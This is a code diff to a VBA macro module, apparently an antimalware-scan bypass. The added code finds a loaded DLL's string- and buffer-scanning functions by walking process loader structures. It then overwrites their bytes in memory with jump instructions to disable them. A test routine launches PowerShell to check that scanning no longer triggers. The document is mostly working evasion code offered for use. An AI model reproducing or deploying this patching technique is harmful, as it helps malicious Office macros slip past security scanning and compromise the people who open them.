@@ -1,7 +1,4 @@
 Attribute VB_Name = "Module1"
-'''''''''''''''''''''''''''''''''''''''''''''''''''
-''''''''''''''' Data types ''''''''''''''''''''''''
-'''''''''''''''''''''''''''''''''''''''''''''''''''
 
 ' from https://codes-sources.commentcamarche.net/source/42365-affinite-des-processus-et-des-threads
 Private Type PROCESS_BASIC_INFORMATION
@@ -45,23 +42,9 @@ Private Declare Function ReadProcessMemory Lib "kernel32.dll" ( _
     ByRef lpNumberOfBytesRead As Long _
 ) As Boolean
 
-Public Declare Function ZwWriteVirtualMemory _
-               Lib "NTDLL.DLL" (ByVal ProcessHandle As Long, _
-                                ByVal BaseAddress As Long, _
-                                ByVal pBuffer As Long, _
-                                ByVal NumberOfBytesToWrite As Long, _
-                                ByRef NumberOfBytesWritten As Long) As Long
+Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
 
-Public Declare Function ZwProtectVirtualMemory _
-               Lib "NTDLL.DLL" (ByVal ProcessHandle As Long, _
-                                ByVal BaseAddress As Long, _
-                                ByVal RegionSize As Long, _
-                                ByVal NewProtect As Long, _
-                                ByVal OldProtect As Long) As Long
-
-Public Const PAGE_READWRITE As Long = &H4
-Public Const PAGE_GUARD As Long = &H100
-Public Const PAGE_EXECUTE As Long = &H10
+Private Declare PtrSafe Sub ByteSwapper Lib "kernel32.dll" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
 
 Sub Main()
 
@@ -69,13 +52,18 @@ Sub Main()
     Dim PEB As PEB
     Dim pbi As PROCESS_BASIC_INFORMATION
 
-    Dim ReadBytes As LongPtr
+    Dim ReadBytes As Long
+    Dim SingleByte As Byte
+    Dim ByteToWrite As String
     Dim PEBLdrAddress As Long
+    Dim ReadAddress As Long
     
     Dim InLoadOrderLinksStart As String
     Dim InLoadOrderLinksEnd As String
     
     Dim DLLNameBytes As String
+    
+    Dim Patched As Integer
     
     Result = NtQueryInformationProcess(-1, 0, pbi, Len(pbi), size)
     
@@ -221,15 +209,86 @@ Sub Main()
             success = ReadProcessMemory(-1, ByVal (FuncStart + (4 * 4)), VarPtr(ReadBytes), Len(ReadBytes), size)
             ASString = BaseAddress + ReadBytes
             Debug.Print "A_Scan_String Function Address: " & Hex(ASString)
-                              
-            'result = ZwProtectVirtualMemory(-1, ByVal (current + 28), 4, 64, 0)
-            'success = ZwWriteVirtualMemory(-1, ByVal (current + 28), VarPtr(ReadBytes), 4, size)
-
+                        
+            'There are numerous different ways that the relevant
+            'Functions can be patched out, modify as necessary
+            
+            'Patch out first function
+            ReadAddress = ASString + 5
+            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
+            ReadByte = SingleByte
+            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
+            'Check the value we read is expected and if so, patch
+            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
+            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "EB")
+                                   
+            ReadAddress = ASString + 6
+            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
+            ReadByte = SingleByte
+            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
+            'Check the value we read is expected and if so, patch
+            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
+            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "3E")
+           
+            'Patch out second function
+            ReadAddress = ASBuffer + 10
+            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
+            ReadByte = SingleByte
+            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
+            'Check the value we read is expected and if so, patch
+            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
+            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "E9")
+            
+            'Patch out second function
+            ReadAddress = ASBuffer + 11
+            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
+            ReadByte = SingleByte
+            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
+            'Check the value we read is expected and if so, patch
+            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
+            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "8F")
+            
+            'Patch out second function
+            ReadAddress = ASBuffer + 12
+            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
+            ReadByte = SingleByte
+            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
+            'Check the value we read is expected and if so, patch
+            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
+            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "00")
+            
+            'Patch out second function
+            ReadAddress = ASBuffer + 13
+            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
+            ReadByte = SingleByte
+            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
+            'Check the value we read is expected and if so, patch
+            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
+            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "00")
+            
+            'Patch out second function
+            ReadAddress = ASBuffer + 14
+            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
+            ReadByte = SingleByte
+            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
+            'Check the value we read is expected and if so, patch
+            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
+            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "00")
+            
             Exit Do
         End If
     Loop
     
-    
+End Sub
+
+
+
+Sub FailTest()
+
+'The below is enough to set things off
+MsgBox "This should fail, if patching not applied", vbInformation
+x = Shell("powershell.exe")
+
 End Sub
 
 
